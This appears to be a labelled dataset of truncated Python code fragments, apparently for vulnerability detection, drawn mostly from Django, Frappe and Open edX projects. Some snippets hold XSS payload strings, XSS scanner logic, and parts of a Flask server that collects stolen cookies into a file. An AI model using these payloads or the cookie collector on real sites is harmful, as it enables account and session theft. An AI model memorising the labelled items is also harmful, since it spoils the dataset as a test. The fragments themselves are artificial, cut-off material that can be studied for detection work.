\"docstatus\"))=", "label": 0}, {"snippet_id": 7308, "code": "'press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings", "label": 0}, {"snippet_id": 27322, "code": " logging import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import db_config from config import local_config from datastore", "label": 0}, {"snippet_id": 41898, "code": " and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self", "label": 0}, {"snippet_id": 31371, "code": "\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max", "label": 0}, {"snippet_id": 2897, "code": "=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace", "label": 0}, {"snippet_id": 2700, "code": ": print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, ", "label": 0}, {"snippet_id": 51885, "code": "'DJANGO_LOG_LEVEL', 'DEBUG'), }, }, } CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost", "label": 0}, {"snippet_id": 44194, "code": ".lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models", "label": 0}, {"snippet_id": 47358, "code": " import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET", "label": 0}, {"snippet_id": 47398, "code": ".authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar", "label": 0}, {"snippet_id": 5348, "code": "'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea", "label": 0}, {"snippet_id": 47627, "code": "'allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>'))", "label": 0}, {"snippet_id": 38392, "code": "=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1", "label": 0}, {"snippet_id": 30918, "code": ".get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t", "label": 0}, {"snippet_id": 39680, "code": " missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn", "label": 0}, {"snippet_id": 46205, "code": " collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json", "label": 0}, {"snippet_id": 42879, "code": " \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value", "label": 0}, {"snippet_id": 25299, "code": "=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs['required", "label": 0}, {"snippet_id": 10923, "code": " else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"", "label": 0}, {"snippet_id": 44939, "code": " @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request", "label": 0}, {"snippet_id": 53727, "code": "=make_eb_config(application_name, default_region) fh=open(dest, 'w') fh.write(contents) fh.close() if __name__=='__main__': parser=argparse.ArgumentParser(description='EB Config Maker') parser.add_argument('--dest", "label": 0}, {"snippet_id": 12083, "code": "/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses", "label": 0}, {"snippet_id": 11111, "code": " fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store", "label": 0}, {"snippet_id": 54394, "code": " refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text='Quit', command=main.destroy).grid(row=11,", "label": 0}, {"snippet_id": 51156, "code": "(pytz.utc) +timedelta(seconds=y) return date class Meta: ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule", "label": 0}, {"snippet_id": 8983, "code": ")$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 52956, "code": ".user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document", "label": 0}, {"snippet_id": 7850, "code": ", name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 39231, "code": "\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", ", "label": 0}, {"snippet_id": 50501, "code": "')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request):", "label": 0}, {"snippet_id": 25479, "code": ") super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean", "label": 0}, {"snippet_id": 23610, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 1637, "code": "\"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print", "label": 0}, {"snippet_id": 38784, "code": "] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self", "label": 0}, {"snippet_id": 53426, "code": " if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner", "label": 0}, {"snippet_id": 22751, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r", "label": 0}, {"snippet_id": 10534, "code": "._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir", "label": 0}, {"snippet_id": 46851, "code": ".get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content: return '' return markdown(content) async def clear_mc(self): for", "label": 1}, {"snippet_id": 3309, "code": " referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=", "label": 0}, {"snippet_id": 13801, "code": "=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*", "label": 0}, {"snippet_id": 6494, "code": " authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self", "label": 0}, {"snippet_id": 46611, "code": " import reverse from.entryform import EntryForm, entry_form_config, build_question_flag from.models import LifeCondition, Benefit, BenefitRequirement class BenefitOverview(TemplateView): template_name=", "label": 0}, {"snippet_id": 5038, "code": "/button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">", "label": 0}, {"snippet_id": 43696, "code": "(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden", "label": 0}, {"snippet_id": 14372, "code": "/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views", "label": 0}, {"snippet_id": 36328, "code": ".print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from", "label": 0}, {"snippet_id": 42508, "code": "\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel", "label": 0}, {"snippet_id": 39364, "code": "\"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif", "label": 0}, {"snippet_id": 49954, "code": "(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the webclient. \"\"\" import json import re import time from twisted", "label": 0}, {"snippet_id": 20803, "code": "), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME", "label": 0}, {"snippet_id": 19374, "code": " def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): ", "label": 0}, {"snippet_id": 38989, "code": "() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t", "label": 0}, {"snippet_id": 52435, "code": ".get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node", "label": 0}, {"snippet_id": 37632, "code": ", filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters", "label": 0}, {"snippet_id": 17677, "code": ", url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user", "label": 0}, {"snippet_id": 22508, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', ", "label": 0}, {"snippet_id": 54562, "code": "**kwargs): context=super().get_context_data(**kwargs) context['articles']=self.object.article_set.all() context['form']=CommentForm() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002", "label": 0}, {"snippet_id": 28066, "code": ".set_cookie( 'session', session_cookie, expires=expires, httponly=True, secure=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\"", "label": 0}, {"snippet_id": 14220, "code": "?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG", "label": 0}, {"snippet_id": 26968, "code": ".content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method, params, hidden_param_name,", "label": 0}, {"snippet_id": 19875, "code": "\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec", "label": 0}, {"snippet_id": 26363, "code": " invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))", "label": 0}, {"snippet_id": 17728, "code": " url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib", "label": 0}, {"snippet_id": 13215, "code": ".auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$'", "label": 0}, {"snippet_id": 29664, "code": " \t def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout", "label": 0}, {"snippet_id": 21097, "code": ".COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 21412, "code": "', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/", "label": 0}, {"snippet_id": 44697, "code": " workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response", "label": 0}, {"snippet_id": 16885, "code": "<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\")", "label": 0}, {"snippet_id": 40056, "code": ".meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length", "label": 0}, {"snippet_id": 33913, "code": " filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters", "label": 0}, {"snippet_id": 41059, "code": " published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger)", "label": 0}, {"snippet_id": 14053, "code": "/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 12983, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL", "label": 0}, {"snippet_id": 28091, "code": "\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie(auth.get_session_cookie()) except auth.AuthError: logs.log_error('Failed to revoke session cookie.') self.response.delete_cookie('session') self", "label": 0}, {"snippet_id": 43489, "code": ".fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len", "label": 0}, {"snippet_id": 47035, "code": " import json from flask import flash from flask_admin.contrib.sqla import ModelView from flask_babelex import gettext as _ from invenio_admin.filters import FilterConverter from invenio_db import db from", "label": 0}, {"snippet_id": 14157, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 51095, "code": " return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz", "label": 0}, {"snippet_id": 5114, "code": "(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s", "label": 0}, {"snippet_id": 32250, "code": " to run on(default=%(default)s)') parser.add_argument('-d', '--directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port", "label": 0}, {"snippet_id": 15386, "code": ") def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self", "label": 0}, {"snippet_id": 24680, "code": " If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo", "label": 0}, {"snippet_id": 52226, "code": ")) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request", "label": 0}, {"snippet_id": 20824, "code": ", 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile'", "label": 0}, {"snippet_id": 24726, "code": " Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should", "label": 0}, {"snippet_id": 16051, "code": ".MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"),", "label": 0}, {"snippet_id": 42806, "code": "\t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname", "label": 0}, {"snippet_id": 27107, "code": "\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if len(page) > 0 and len(params) > 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value", "label": 1}, {"snippet_id": 44971, "code": " param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie", "label": 0}, {"snippet_id": 47578, "code": "'Notes:<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes))) else: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email')) f.add_content(PlainText(\"Display name:", "label": 0}, {"snippet_id": 39550, "code": ") is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df", "label": 0}, {"snippet_id": 3663, "code": " import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload", "label": 0}, {"snippet_id": 7315, "code": ".redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key=", "label": 0}, {"snippet_id": 41106, "code": "=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_(", "label": 0}, {"snippet_id": 36697, "code": "(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated", "label": 0}, {"snippet_id": 24420, "code": ".log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest", "label": 0}, {"snippet_id": 53880, "code": "=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')", "label": 0}, {"snippet_id": 14857, "code": ".xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 52995, "code": "(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials", "label": 1}, {"snippet_id": 3779, "code": " print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact", "label": 0}, {"snippet_id": 31787, "code": ".getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e) \t\t if form", "label": 0}, {"snippet_id": 53835, "code": "/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +", "label": 1}, {"snippet_id": 45839, "code": " request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator", "label": 0}, {"snippet_id": 18216, "code": ", name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "label": 1}, {"snippet_id": 10740, "code": ") self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir ", "label": 0}, {"snippet_id": 9813, "code": "(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth", "label": 0}, {"snippet_id": 27559, "code": "\"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron'", "label": 0}, {"snippet_id": 15098, "code": "'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('')", "label": 0}, {"snippet_id": 53122, "code": " coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype", "label": 0}, {"snippet_id": 41904, "code": "\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue", "label": 0}, {"snippet_id": 28320, "code": "=form.getvalue('serv') def get_app_dir(): \td=sys.path[0] \td=d.split('/')[-1]\t\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import", "label": 0}, {"snippet_id": 14403, "code": " url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 11247, "code": "(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args", "label": 0}, {"snippet_id": 53887, "code": "\nfrom flask import Flask,request from termcolor import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n", "label": 1}, {"snippet_id": 20996, "code": ", 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower", "label": 0}, {"snippet_id": 23906, "code": ".assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite(''", "label": 1}, {"snippet_id": 51940, "code": " VENDOR_DIR=os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) +'/../vendor/') +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders", "label": 0}, {"snippet_id": 45460, "code": "(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping", "label": 0}, {"snippet_id": 40605, "code": "=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document", "label": 0}, {"snippet_id": 15253, "code": " use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss", "label": 0}, {"snippet_id": 52173, "code": ".dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return 